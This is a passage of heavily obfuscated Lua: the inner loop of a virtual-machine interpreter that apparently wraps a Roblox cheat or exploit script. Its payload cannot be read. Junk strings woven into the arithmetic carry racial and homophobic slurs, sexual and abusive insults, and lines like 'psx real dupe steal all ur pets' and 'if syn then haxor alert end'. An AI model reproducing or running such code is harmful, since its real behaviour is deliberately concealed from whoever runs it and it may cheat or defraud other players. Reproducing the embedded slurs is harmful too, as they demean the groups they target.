=_+l;e=n[_];o[e[U]]=x[e[w]];_=_+l;e=n[_];o[e[a]]=e[u];_=_+l;e=n[_];d=e[s]o[d](o[d+O])_=_+l;e=n[_];o[e[s]]=x[e[u]];_=_+l;e=n[_];o[e[r]]=o[e[u]][e[P]];_=_+l;e=n[_];o[e[s]]=o[e[w]][e[B]];_=_+l;e=n[_];o[e[k]]=o[e[f]][e[C]];_=_+l;e=n[_];o[e[i]]=o[e[b]][e[D]];_=_+l;e=n[_];o[e[s]]=x[e[w]];_=_+l;e=n[_];o[e[a]][e[u]]=o[e[N]];_=_+l;e=n[_];o[e[a]]=x[e[t]];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];d=e[a]o[d](o[d+O])_=_+l;e=n[_];o[e[s]]=x[e[f]];_=_+l;e=n[_];o[e[U]]=o[e[b]][e[g]];_=_+l;e=n[_];o[e[U]]=o[e[u]][e[g]];_=_+l;e=n[_];o[e[k]]=o[e[w]][e[D]];_=_+l;e=n[_];o[e[U]]=o[e[h]][e[P]];_=_+l;e=n[_];o[e[r]]=x[e[w]];_=_+l;e=n[_];o[e[U]][e[f]]=o[e[P]];_=_+l;e=n[_];o[e[i]]=x[e[f]];break end;break;end while(d)/((-#[[Show me your meme stealing license]]+(2541-0x52b)))==314 do d=(489559)while c>(-#"hi momma teach me how to make incest"+(-78+0xa1))do d-= d o[e[a]]=x[e[h]];break end while(d)/((127617/0xb1))==679 do local l=e[f];local _=o[l]for e=l+1,e[g]do _=_..o[e];end;o[e[s]]=_;break end;break;end break;end break;end while(d)/((0x1e83-3927))==3775 do d=(1068430)while c<=(-0x2c+96)do d-= d d=(2981448)while(10100/0xca)>=c do d-= d d=(605151)while c>(0x78-71)do d-= d local l=e[U];local d=o[l+2];local n=o[l]+d;o[l]=n;if(d>0)then if(n<=o[l+1])then _=e[u];o[l+3]=n;end elseif(n>=o[l+1])then _=e[f];o[l+3]=n;end break end while 2511==(d)/((17593/0x49))do local e={o,e};e[O][e[m][i]]=e[l][e[m][P]]+e[O][e[m][f]];break end;break;end while(d)/((3216-0x684))==1926 do d=(1476156)while c>(0x22dd/175)do d-= d if(o[e[k]]~=e[g])then _=_+O;else _=e[w];end;break end while 844==(d)/(((329718/0xb3)+-#[[MSC 793z487nhvcgsdfgsudfza9889jgvz56gz56z547684z5g54z948g56z74j56475jzg645z6456 oh wait bitch]]))do do return end;break end;break;end break;end while(d)/(((-119+0x2dd)+-#'kys nigga'))==1766 do d=(1233045)while(13608/0xfc)>=c do d-= d d=(3276336)while c>((0xff-177)+-#[[ive seen your mothers ass]])do d-= d _=e[b];break end while(d)/((0x9c3f0/201))==1029 do local e=e[i]o[e](M(o,e+O,S))break end;break;end while 517==(d)/((0x12f5-2468))do d=(4851594)while c>(230-0xaf)do d-= d if(o[e[a]]==o[e[B]])then _=_+O;else _=e[h];end;break end while(d)/((562606/0xef))==2061 do local d;o[e[k]]=e[f];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[r]]=e[b];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[h]))_=_+l;e=n[_];x[e[h]]=o[e[r]];_=_+l;e=n[_];o[e[a]]=x[e[h]];break end;break;end break;end break;end break;end break;end break;end while 3451==(d)/((118550/0x32))do d=(1158840)while((-108+0x104)+-#'give me moonsex v4 or i will attach a car battery to your testicles')>=c do d-= d d=(7146972)while(0xd1-139)>=c do d-= d d=(143227)while c<=(0x2d48/184)do d-= d d=(13405652)while c<=(152-0x5d)do d-= d d=(1213440)while c<=(-#[[You are an absolute baboon]]+(6391/0x4d))do d-= d local e=e[r]o[e](o[e+O])break;end while(d)/(((0x2e2-402)+-#[[atakan der nigga]]))==3792 do d=(5918505)while(0x78+-62)<c do d-= d local e=e[a]o[e]=o[e](M(o,e+l,S))break end while 1723==(d)/((357240/0x68))do local _=e[a]local n,e=p(o[_](M(o,_+1,e[t])))S=e+_-1 local e=0;for _=_,S do e=e+l;o[_]=n[e];end;break end;break;end break;end while 3631==(d)/((431964/0x75))do d=(12086010)while(0xc1-(336-0xcc))>=c do d-= d d=(7078104)while c>((141+-0x47)+-#'I can tell')do d-= d o[e[r]]=e[h];break end while 1944==(d)/((((0x14ab46-677319)+-#'impulse reel pastebin')/186))do o[e[r]][o[e[w]]]=o[e[P]];break end;break;end while 3483==(d)/(((0xbd847/223)+-#[[monkey mode]]))do d=(2515779)while(-#'paidlancer'+((0xe0040/177)/72))<c do d-= d local a=I[e[u]];local d;local l={};d=H({},{__index=function(_,e)local e=l[e];return e[1][e[2]];end,__newindex=function(o,e,_)local e=l[e]e[1][e[2]]=_;end;});for d=1,e[N]do _=_+O;local e=n[_];if e[((3808/0x88)+-#[[Nsrds GAYYYYAIAHAKAJAVAHAUA]])]==8 then l[d-1]={o,e[f]};else l[d-1]={y,e[w]};end;z[#z+1]=l;end;o[e[r]]=v(a,d,x);break end while(d)/((-#"cilertedcool"+(0xd76-1733)))==1479 do o[e[i]]=o[e[t]][o[e[g]]];break end;break;end break;end break;end while(d)/(((39970/0x46)+-#[[Zapperqr is leaker]]))==259 do d=(714125)while c<=(12078/0xb7)do d-= d d=(7857222)while c<=(-#[[rule 2 ok]]+(0x2da0/160))do d-= d o[e[a]]=y[e[h]];break;end while(d)/((0x8a5f2/190))==2634 do d=(6818207)while(-84+0x95)<c do d-= d local d;x[e[u]]=o[e[k]];_=_+l;e=n[_];o[e[a]]=x[e[u]];_=_+l;e=n[_];o[e[i]]=o[e[b]][e[C]];_=_+l;e=n[_];o[e[r]]=e[h];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];o[e[i]]=e[f];_=_+l;e=n[_];o[e[r]]=e[f];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];o[e[r]]=e[f];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];o[e[U]]=e[t];_=_+l;e=n[_];o[e[s]]=e[t];_=_+l;e=n[_];o[e[r]]=e[b];_=_+l;e=n[_];d=e[U]o[d]=o[d](M(o,d+l,e[u]))_=_+l;e=n[_];x[e[f]]=o[e[r]];_=_+l;e=n[_];o[e[k]]=x[e[t]];_=_+l;e=n[_];o[e[r]]=o[e[b]][e[D]];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[U]]=e[u];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[i]]=e[f];_=_+l;e=n[_];o[e[r]]=e[b];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];o[e[a]]=e[u];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];d=e[i]o[d]=o[d](M(o,d+l,e[h]))_=_+l;e=n[_];x[e[t]]=o[e[s]];_=_+l;e=n[_];o[e[r]]=x[e[t]];_=_+l;e=n[_];o[e[r]]=o[e[h]][e[B]];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[r]]=e[h];_=_+l;e=n[_];o[e[r]]=e[f];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];o[e[U]]=e[t];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[U]]=e[b];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];o[e[s]]=e[b];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[t]))_=_+l;e=n[_];x[e[w]]=o[e[r]];_=_+l;e=n[_];o[e[i]]=x[e[u]];_=_+l;e=n[_];o[e[U]]=o[e[h]][e[P]];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[s]]=e[f];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];o[e[i]]=e[w];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];o[e[r]]=e[t];_=_+l;e=n[_];o[e[U]]=e[b];_=_+l;e=n[_];o[e[s]]=e[b];_=_+l;e=n[_];o[e[s]]=e[f];_=_+l;e=n[_];o[e[U]]=e[f];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];d=e[s]o[d]=o[d](M(o,d+l,e[w]))_=_+l;e=n[_];x[e[h]]=o[e[i]];_=_+l;e=n[_];o[e[k]]=x[e[f]];_=_+l;e=n[_];o[e[k]]=o[e[u]][e[B]];_=_+l;e=n[_];o[e[k]]=e[f];_=_+l;e=n[_];o[e[a]]=e[t];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[U]]=e[w];_=_+l;e=n[_];o[e[r]]=e[u];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];o[e[a]]=e[u];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];d=e[k]o[d]=o[d](M(o,d+l,e[h]))break end while 3971==(d)/((-60+0x6f1))do local e=e[k]o[e](o[e+O])break end;break;end break;end while 197==(d)/((0x3d10d/69))do d=(6281352)while(7072/0x68)>=c do d-= d d=(6536730)while c>(-0x73+182)do d-= d local _=e[k]local d={o[_](o[_+1])};local n=0;for e=_,e[g]do n=n+l;o[e]=d[n];end break end while(d)/((-92+0x82b))==3270 do if(o[e[i]]~=e[N])then _=_+O;else _=e[t];end;break end;break;end while 3388==(d)/((-0x7b+1977))do d=(3317890)while c>(13041/0xbd)do d-= d do return o[e[U]]end break end while(d)/(((0x9d8+-46)+-#[[0nly 1337]]))==1346 do o[e[a]]=(e[w]~=0);break end;break;end break;end break;end break;end while(d)/((-0x3e+2575))==2844 do d=(2227960)while(-#'psx real dupe steal all ur pets no joke'+(153+-0x25))>=c do d-= d d=(439587)while((0x50b8/246)+-#'nicowashere')>=c do d-= d d=(1699227)while c<=(-#"testpsx dupe no scam legit 2022 free no virus"+(-48+0xa4))do d-= d o[e[i]]=o[e[w]];break;end while 1569==(d)/((-117+0x4b0))do d=(2881065)while((-92+(0x166-189))+-#[[Asses]])<c do d-= d o[e[r]]={};break end while(d)/((-0x45+2826))==1045 do _=e[h];break end;break;end break;end while(d)/(((37050/0x32)+-#"my name jeff"))==603 do d=(2690029)while((0x2574/94)+-#"if syn then haxor alert end")>=c do d-= d d=(617344)while(-#'Reduce meme string slowmode when plsplspls'+(928/0x8))<c do d-= d local _=e[a]o[_]=o[_](M(o,_+l,e[t]))break end while 848==(d)/((-0x23+763))do x[e[f]]=o[e[a]];break end;break;end while 1343==(d)/((0x1005-2098))do d=(802938)while(0xbc-(28224/0xfc))<c do d-= d local e=e[r]o[e]=o[e]()break end while(d)/(((0x816c/66)+-#'suck my balls'))==1642 do if(o[e[s]]~=o[e[C]])then _=_+O;else _=e[t];end;break end;break;end break;end break;end while 730==(d)/((115976/0x26))do d=(2437408)while(9477/0x75)>=c do d-= d d=(7464600)while c<=(0xee-159)do d-= d d=(9737468)while c>(-#"ÑÑÑÑÑÑÑ"+(219-0x86))do d-= d local d;o[e[i]]=x[e[f]];_=_+l;e=n[_];o[e[s]]=o[e[f]][e[P]];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[U]]=e[w];_=_+l;e=n[_];o[e[U]]=e[w];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[k]]=e[t];_=_+l;e=n[_];o[e[a]]=e[w];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[s]]=e[t];_=_+l;e=n[_];o[e[a]]=e[w];_=_+l;e=n[_];o[e[i]]=e[w];_=_+l;e=n[_];o[e[r]]=e[b];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[f]))_=_+l;e=n[_];x[e[u]]=o[e[k]];_=_+l;e=n[_];o[e[k]]=x[e[h]];_=_+l;e=n[_];o[e[k]]=o[e[u]][e[N]];_=_+l;e=n[_];o[e[r]]=e[u];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[k]]=e[u];_=_+l;e=n[_];o[e[s]]=e[w];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];o[e[a]]=e[u];_=_+l;e=n[_];o[e[a]]=e[f];_=_+l;e=n[_];o[e[k]]=e[t];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];d=e[U]o[d]=o[d](M(o,d+l,e[t]))_=_+l;e=n[_];x[e[f]]=o[e[a]];_=_+l;e=n[_];o[e[U]]=x[e[u]];_=_+l;e=n[_];o[e[s]]=o[e[w]][e[D]];_=_+l;e=n[_];o[e[U]]=e[b];_=_+l;e=n[_];o[e[U]]=e[t];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[a]]=e[t];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[U]]=e[b];_=_+l;e=n[_];o[e[a]]=e[f];_=_+l;e=n[_];o[e[s]]=e[w];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[i]]=e[w];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[f]))_=_+l;e=n[_];x[e[w]]=o[e[a]];_=_+l;e=n[_];o[e[U]]=x[e[t]];_=_+l;e=n[_];o[e[a]]=o[e[t]][e[B]];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];o[e[r]]=e[u];_=_+l;e=n[_];o[e[r]]=e[t];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[i]]=e[w];_=_+l;e=n[_];o[e[k]]=e[f];_=_+l;e=n[_];o[e[U]]=e[h];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[k]]=e[t];_=_+l;e=n[_];o[e[s]]=e[f];_=_+l;e=n[_];d=e[i]o[d]=o[d](M(o,d+l,e[t]))_=_+l;e=n[_];x[e[u]]=o[e[r]];_=_+l;e=n[_];o[e[r]]=x[e[w]];_=_+l;e=n[_];o[e[a]]=o[e[w]][e[D]];_=_+l;e=n[_];o[e[s]]=e[w];_=_+l;e=n[_];o[e[k]]=e[f];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[U]]=e[t];_=_+l;e=n[_];o[e[U]]=e[f];_=_+l;e=n[_];o[e[s]]=e[w];_=_+l;e=n[_];o[e[r]]=e[u];_=_+l;e=n[_];o[e[U]]=e[u];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[U]]=e[f];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[w]))_=_+l;e=n[_];x[e[u]]=o[e[a]];break end while(d)/((-#"impulse is hot"+(0x1498-2671)))==3764 do local l=e[k];local n=o[l]local d=o[l+2];if(d>0)then if(n>o[l+1])then _=e[w];else o[l+3]=n;end elseif(n<o[l+1])then _=e[w];else o[l+3]=n;end break end;break;end while(d)/((6883-0xda2))==2200 do d=(2970286)while(-#"Omg guys"+(219-0x83))<c do d-= d local e=e[k]o[e]=o[e]()break end while(d)/((-#[[Ur mom]]+(-0x3f+971)))==3293 do local r;local d;o[e[s]]=e[t];_=_+l;e=n[_];d=e[k]o[d]=o[d](M(o,d+l,e[u]))_=_+l;e=n[_];d=e[i];r=o[e[b]];o[d+1]=r;o[d]=r[e[B]];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[h]))_=_+l;e=n[_];d=e[i];r=o[e[w]];o[d+1]=r;o[d]=r[e[P]];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];o[e[k]]=e[b];break end;break;end break;end while 944==(d)/(((0x1490-2675)+-#[[elbicho]]))do d=(1196874)while c<=(((-#'no penne pasta'+(-9+-0x33))+162)+-#[[Bwomp]])do d-= d d=(4526615)while c>(-#'nerd emoji x7'+(0x11c-189))do d-= d if(o[e[U]]==e[B])then _=_+O;else _=e[u];end;break end while 1735==(d)/((-#[[cheeseburger]]+(-61+0xa7a)))do local c;local u,k;local w;local d;o[e[r]]=x[e[t]];_=_+l;e=n[_];d=e[i];w=o[e[t]];o[d+1]=w;o[d]=w[e[P]];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];d=e[r]u,k=p(o[d](M(o,d+1,e[b])))S=k+d-1 c=0;for e=d,S do c=c+l;o[e]=u[c];end;_=_+l;e=n[_];d=e[s]o[d]=o[d](M(o,d+l,S))_=_+l;e=n[_];d=e[s]o[d]=o[d]()_=_+l;e=n[_];o[e[r]]=o[e[b]][e[C]];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[a]]=e[f];_=_+l;e=n[_];d=e[U]o[d]=o[d](M(o,d+l,e[b]))break end;break;end while 354==(d)/((6857-0xd94))do d=(1128159)while(253-0xa9)<c do d-= d local d;o[e[s]]=o[e[h]][e[N]];_=_+l;e=n[_];o[e[i]]=y[e[h]];_=_+l;e=n[_];o[e[r]]=o[e[w]];_=_+l;e=n[_];d=e[k]o[d](M(o,d+O,e[f]))_=_+l;e=n[_];o[e[s]]=x[e[f]];_=_+l;e=n[_];o[e[k]]();_=_+l;e=n[_];o[e[k]]=x[e[b]];break end while(d)/(((744-0x198)+-#'if syn then haxor alert end'))==3651 do do return o[e[i]]end break end;break;end break;end break;end break;end break;end while(d)/(((1746+-0x4d)+-#'null'))==696 do d=(412022)while c<=(0xd3+-112)do d-= d d=(2019421)while c<=(-#"nigga porn 360"+(133+-0x1b))do d-= d d=(4304965)while c<=(-106+0xc2)do d-= d d=(2497792)while c<=(0x10d-183)do d-= d local e={o,e};e[O][e[m][a]]=e[l][e[m][B]]+e[O][e[m][w]];break;end while(d)/((-0x76+822))==3548 do d=(2227029)while c>(-#"me when they are is have the me when are is do me when"+(19035/0x87))do d-= d o[e[i]][e[t]]=o[e[g]];break end while(d)/(((93300/0x4b)+-#'I boiled them into scrambled eggs'))==1839 do local _=e[r];local l=o[e[t]];o[_+1]=l;o[_]=l[e[N]];break end;break;end break;end while 1645==(d)/((-24+0xa51))do d=(7808500)while c<=(4320/0x30)do d-= d d=(4655805)while(-#[[impulse 2022]]+(0x33af/131))<c do d-= d local e={e,o};e[m][e[O][a]]=e[m][e[l][h]]+e[O][B];break end while 4031==(d)/((0x4d2+-79))do local c;local m,B;local O;local a;local d;o[e[U]]=o[e[w]][e[P]];_=_+l;e=n[_];d=e[s];a=o[e[t]];o[d+1]=a;o[d]=a[e[P]];_=_+l;e=n[_];o[e[s]]=x[e[u]];_=_+l;e=n[_];d=e[r];a=o[e[f]];o[d+1]=a;o[d]=a[e[C]];_=_+l;e=n[_];o[e[r]]=e[h];_=_+l;e=n[_];o[e[r]]=y[e[b]];_=_+l;e=n[_];o[e[U]]=e[w];_=_+l;e=n[_];a=e[b];O=o[a]for e=a+1,e[g]do O=O..o[e];end;o[e[i]]=O;_=_+l;e=n[_];d=e[r]m,B=p(o[d](M(o,d+1,e[f])))S=B+d-1 c=0;for e=d,S do c=c+l;o[e]=m[c];end;_=_+l;e=n[_];d=e[s]o[d]=o[d](M(o,d+l,S))_=_+l;e=n[_];o[e[k]]=o[e[w]];_=_+l;e=n[_];_=e[t];break end;break;end while 1940==(d)/((-#"What I gotta do to get it through to you Im superhuman"+(0x9560a/(-#[[goofy ahh uncle productions]]+(414-0xed)))))do d=(285360)while c>((0x5d7/13)+-#'keno 0347 is a nerdy fag')do d-= d o[e[i]]();break end while 120==(d)/(((0x12da-2424)+-#"Big hairy logs are yummy"))do local d;o[e[a]]=y[e[w]];_=_+l;e=n[_];d=e[U]o[d]=o[d](o[d+O])_=_+l;e=n[_];o[e[a]]=x[e[u]];_=_+l;e=n[_];o[e[s]]=o[e[h]];_=_+l;e=n[_];d=e[k]o[d]=o[d](o[d+O])_=_+l;e=n[_];if(o[e[k]]==o[e[B]])then _=_+O;else _=e[h];end;break end;break;end break;end break;end while 883==(d)/((564889/0xf7))do d=(11323312)while((322-0xd7)+-#[[deadphonelua]])>=c do d-= d d=(5081440)while c<=(127+-0x22)do d-= d do return end;break;end while(d)/((-#'nicuse is nil skull'+(0x1577a/30)))==1745 do d=(3816656)while c>(16450/0xaf)do d-= d local d;d=e[a]o[d](o[d+O])_=_+l;e=n[_];o[e[i]]=x[e[b]];_=_+l;e=n[_];o[e[r]]=o[e[u]][e[N]];_=_+l;e=n[_];o[e[U]]=o[e[h]][e[D]];_=_+l;e=n[_];o[e[i]]=o[e[t]][e[D]];_=_+l;e=n[_];o[e[k]]=o[e[w]][e[C]];_=_+l;e=n[_];o[e[i]]=x[e[b]];_=_+l;e=n[_];o[e[r]][e[t]]=o[e[C]];_=_+l;e=n[_];o[e[U]]=x[e[u]];_=_+l;e=n[_];o[e[a]]=e[w];_=_+l;e=n[_];d=e[k]o[d](o[d+O])_=_+l;e=n[_];o[e[i]]=x[e[t]];_=_+l;e=n[_];o[e[r]]=o[e[f]][e[P]];_=_+l;e=n[_];o[e[r]]=o[e[w]][e[C]];_=_+l;e=n[_];o[e[i]]=o[e[h]][e[B]];_=_+l;e=n[_];o[e[i]]=o[e[t]][e[N]];_=_+l;e=n[_];o[e[k]]=x[e[h]];_=_+l;e=n[_];o[e[s]][e[b]]=o[e[B]];_=_+l;e=n[_];o[e[s]]=x[e[b]];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];d=e[s]o[d](o[d+O])_=_+l;e=n[_];o[e[r]]=x[e[h]];_=_+l;e=n[_];o[e[k]]=o[e[t]][e[D]];_=_+l;e=n[_];o[e[r]]=o[e[t]][e[N]];_=_+l;e=n[_];o[e[s]]=o[e[w]][e[C]];_=_+l;e=n[_];o[e[U]]=o[e[b]][e[C]];_=_+l;e=n[_];o[e[i]]=x[e[h]];_=_+l;e=n[_];o[e[a]][e[u]]=o[e[C]];_=_+l;e=n[_];o[e[r]]=x[e[w]];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];d=e[U]o[d](o[d+O])_=_+l;e=n[_];o[e[s]]=x[e[t]];_=_+l;e=n[_];o[e[i]]=o[e[w]][e[D]];_=_+l;e=n[_];o[e[U]]=o[e[h]][e[N]];_=_+l;e=n[_];o[e[i]]=o[e[u]][e[P]];_=_+l;e=n[_];o[e[k]]=o[e[b]][e[N]];_=_+l;e=n[_];o[e[r]]=x[e[u]];_=_+l;e=n[_];o[e[r]][e[f]]=o[e[P]];_=_+l;e=n[_];o[e[i]]=x[e[h]];_=_+l;e=n[_];o[e[i]]=e[b];_=_+l;e=n[_];d=e[k]o[d](o[d+O])_=_+l;e=n[_];o[e[a]]=x[e[h]];_=_+l;e=n[_];o[e[r]]=o[e[t]][e[C]];_=_+l;e=n[_];o[e[U]]=o[e[b]][e[B]];_=_+l;e=n[_];o[e[a]]=o[e[f]][e[g]];_=_+l;e=n[_];o[e[U]]=o[e[b]][e[B]];_=_+l;e=n[_];o[e[i]]=x[e[f]];_=_+l;e=n[_];o[e[U]][e[b]]=o[e[D]];_=_+l;e=n[_];o[e[a]]=x[e[f]];_=_+l;e=n[_];o[e[s]]=e[b];_=_+l;e=n[_];d=e[r]o[d](o[d+O])_=_+l;e=n[_];o[e[a]]=x[e[t]];_=_+l;e=n[_];o[e[k]]=o[e[t]][e[g]];_=_+l;e=n[_];o[e[k]]=o[e[u]][e[N]];_=_+l;e=n[_];o[e[a]]=o[e[h]][e[C]];_=_+l;e=n[_];o[e[r]]=o[e[h]][e[D]];_=_+l;e=n[_];o[e[a]]=x[e[w]];_=_+l;e=n[_];o[e[s]][e[b]]=o[e[D]];_=_+l;e=n[_];o[e[s]]=x[e[t]];_=_+l;e=n[_];o[e[r]]=e[b];_=_+l;e=n[_];d=e[k]o[d](o[d+O])_=_+l;e=n[_];o[e[U]]=x[e[b]];_=_+l;e=n[_];o[e[s]]=o[e[b]][e[B]];_=_+l;e=n[_];o[e[r]]=o[e[f]][e[g]];_=_+l;e=n[_];o[e[a]]=o[e[w]][e[P]];_=_+l;e=n[_];o[e[r]]=o[e[t]][e[D]];_=_+l;e=n[_];o[e[a]]=x[e[u]];_=_+l;e=n[_];o[e[k]][e[b]]=o[e[N]];_=_+l;e=n[_];o[e[s]]=x[e[h]];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];d=e[U]o[d](o[d+O])_=_+l;e=n[_];o[e[s]]=x[e[b]];_=_+l;e=n[_];o[e[a]]=o[e[w]][e[C]];_=_+l;e=n[_];o[e[U]]=o[e[u]][e[g]];_=_+l;e=n[_];o[e[U]]=o[e[u]][e[B]];_=_+l;e=n[_];o[e[k]]=o[e[h]][e[D]];_=_+l;e=n[_];o[e[s]]=x[e[u]];_=_+l;e=n[_];o[e[i]][e[h]]=o[e[g]];_=_+l;e=n[_];o[e[r]]=x[e[f]];_=_+l;e=n[_];o[e[i]]=e[u];break end while 3628==(d)/((((-#"I feel a good"+(-8487/0xcf))+1120)+-#[[no penne pasta]]))do o[e[a]]=(e[h]~=0);break end;break;end break;end while 2828==(d)/((-0x48+4076))do d=(5609259)while c<=(231-0x86)do d-= d d=(200160)while((-97+(292+-0x4b))+-#[[0nly 1337 smashed ur wap]])<c do d-= d x[e[f]]=o[e[k]];_=_+l;e=n[_];o[e[i]]={};_=_+l;e=n[_];o[e[r]]={};_=_+l;e=n[_];x[e[t]]=o[e[s]];_=_+l;e=n[_];o[e[s]]=x[e[h]];_=_+l;e=n[_];if(o[e[s]]==e[D])then _=_+O;else _=e[f];end;break end while(d)/((2591-0x53c))==160 do if not o[e[k]]then _=_+O;else _=e[h];end;break end;break;end while(d)/((-#[[I can tell]]+(7530-0xebd)))==1497 do d=(11577270)while(293-0xc3)<c do d-= d local l=e[i];local n=o[l]local d=o[l+2];if(d>0)then if(n>o[l+1])then _=e[t];else o[l+3]=n;end elseif(n<o[l+1])then _=e[w];else o[l+3]=n;end break end while 3610==(d)/(((-2847/0x27)+3280))do local l=e[k];local d=o[l+2];local n=o[l]+d;o[l]=n;if(d>0)then if(n<=o[l+1])then _=e[u];o[l+3]=n;end elseif(n>=o[l+1])then _=e[t];o[l+3]=n;end break end;break;end break;end break;end break;end while(d)/((0x324+-115))==598 do d=(4881360)while c<=(176+-0x46)do d-= d d=(1435708)while(2550/0x19)>=c do d-= d d=(8736923)while(0x578/14)>=c do d-= d if(o[e[k]]==o[e[B]])then _=_+O;else _=e[h];end;break;end while(d)/(((4112+-0x3e)+-#'mama mo'))==2161 do d=(572108)while((-#"i fucked your dad"+(670-0x188))-160)<c do d-= d if(o[e[U]]~=o[e[P]])then _=_+O;else _=e[w];end;break end while 628==(d)/((967+(-9856/0xb0)))do local e={e,o};e[m][e[O][a]]=e[m][e[l][t]]+e[O][g];break end;break;end break;end while(d)/((482531/0xcb))==604 do d=(1494045)while(-0x70+216)>=c do d-= d d=(11571610)while(((-0x8a+17)+248)+-#'fatee is gay 0nly on top')<c do d-= d o[e[k]]=(e[u]~=0);_=_+O;break end while(d)/((6340-0xc8a))==3697 do local l=e[u];local _=o[l]for e=l+1,e[B]do _=_..o[e];end;o[e[a]]=_;break end;break;end while 405==(d)/((-#"Wenomechainsama Tumajarbisaun Wifenlooof Eselifterbraun"+(0x1d85-3813)))do d=(9452460)while((11858/0x62)+-#[[Shrimps was here]])<c do d-= d local x;local a;local d;o[e[i]]=e[b];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[k]]=#o[e[w]];_=_+l;e=n[_];o[e[i]]=e[w];_=_+l;e=n[_];d=e[r];a=o[d]x=o[d+2];if(x>0)then if(a>o[d+1])then _=e[h];else o[d+3]=a;end elseif(a<o[d+1])then _=e[t];else o[d+3]=a;end break end while(d)/(((1010295/0xc3)-2611))==3678 do o[e[i]]=#o[e[u]];break end;break;end break;end break;end while(d)/((482460/(0x3b1a/89)))==1720 do d=(1703592)while((-#"ÑÑÑÑÑÑÑ"+(0x198+-73))-0xda)>=c do d-= d d=(3264236)while(0x5388/198)>=c do d-= d d=(3081868)while c>((-0x6c+239)+-#'big niggers sucking cock')do d-= d local a=I[e[f]];local d;local l={};d=H({},{__index=function(_,e)local e=l[e];return e[1][e[2]];end,__newindex=function(o,e,_)local e=l[e]e[1][e[2]]=_;end;});for d=1,e[P]do _=_+O;local e=n[_];if e[(0x2f-46)]==8 then l[d-1]={o,e[f]};else l[d-1]={y,e[b]};end;z[#z+1]=l;end;o[e[r]]=v(a,d,x);break end while(d)/((7917-0xfa6))==788 do if(o[e[a]]<o[e[C]])then _=e[h];else _=_+O;end;break end;break;end while 2836==(d)/((48342/0x2a))do d=(12156512)while(187+-0x4e)<c do d-= d local b;local O,s;local k;local c;local 